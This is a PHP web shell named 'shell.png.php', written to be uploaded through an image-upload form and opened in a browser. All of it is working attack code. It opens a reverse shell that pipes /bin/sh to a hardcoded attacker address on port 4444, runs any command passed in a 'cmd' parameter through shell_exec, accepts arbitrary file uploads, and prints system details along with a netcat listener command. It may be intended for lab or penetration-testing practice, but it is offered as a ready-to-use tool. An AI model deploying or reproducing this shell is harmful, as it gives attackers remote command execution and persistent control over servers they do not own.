<?php
// shell.png.php - Reverse Shell
// Usage: Upload this file and access it via browser

// Disable time limit
set_time_limit(0);

// Your Kali machine IP and port
$ip = '192.168.213.128';  // CHANGE THIS
$port = 4444;          // CHANGE IF NEEDED

// Check if it's a reverse shell request
if(isset($_GET['revshell'])) {
    echo "Attempting reverse shell to $ip:$port...<br>";
    
    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) {
        echo "Error: $errstr ($errno)<br>";
        exit(1);
    }
    
    // Execute shell
    $descriptorspec = array(
        0 => array("pipe", "r"),  // stdin
        1 => array("pipe", "w"),  // stdout
        2 => array("pipe", "w")   // stderr
    );
    
    $process = proc_open('/bin/sh', $descriptorspec, $pipes);
    
    if (is_resource($process)) {
        stream_set_blocking($pipes[0], 0);
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        stream_set_blocking($sock, 0);
        
        while (1) {
            if (feof($sock)) break;
            if (feof($pipes[1])) break;
            
            $read_a = array($sock, $pipes[1], $pipes[2]);
            $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
            
            if (in_array($sock, $read_a)) {
                $input = fread($sock, 1024);
                fwrite($pipes[0], $input);
            }
            
            if (in_array($pipes[1], $read_a)) {
                $output = fread($pipes[1], 1024);
                fwrite($sock, $output);
            }
            
            if (in_array($pipes[2], $read_a)) {
                $error = fread($pipes[2], 1024);
                fwrite($sock, $error);
            }
        }
        
        fclose($sock);
        proc_close($process);
    }
} 
// Web shell functionality
elseif(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
// File upload functionality
elseif(isset($_FILES['file'])) {
    $upload_dir = './';
    $upload_file = $upload_dir . basename($_FILES['file']['name']);
    
    if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
        echo "File uploaded successfully: " . htmlspecialchars(basename($_FILES['file']['name']));
    } else {
        echo "File upload failed!";
    }
}
// Default page
else {
    echo '
    <html>
    <head><title>Shell.png.php</title></head>
    <body>
        <h2>PHP Web Shell</h2>
        
        <h3>Reverse Shell</h3>
        <p>Click the button below to initiate a reverse shell to ' . htmlspecialchars($ip) . ':' . htmlspecialchars($port) . '.</p>
        <p>Be sure to have your listener ready on your Kali machine.</p>
        <p> "nc -lvnp ' . htmlspecialchars($port) . '" </p>
        <form method="get">
            <input type="hidden" name="revshell" value="1">
            <input type="submit" value="Start Reverse Shell">
        </form>
        
        <h3>Command Execution</h3>
        <form method="get">
            <input type="text" name="cmd" value="id" size="50">
            <input type="submit" value="Execute">
        </form>
        
        <h3>File Upload</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="file">
            <input type="submit" value="Upload">
        </form>
        
        <h3>System Info</h3>
        <pre>';
    echo "PHP: " . phpversion() . "\n";
    echo "User: " . shell_exec('whoami') . "\n";
    echo "OS: " . php_uname() . "\n";
    echo '    </pre>
    </body>
    </html>';
}
?>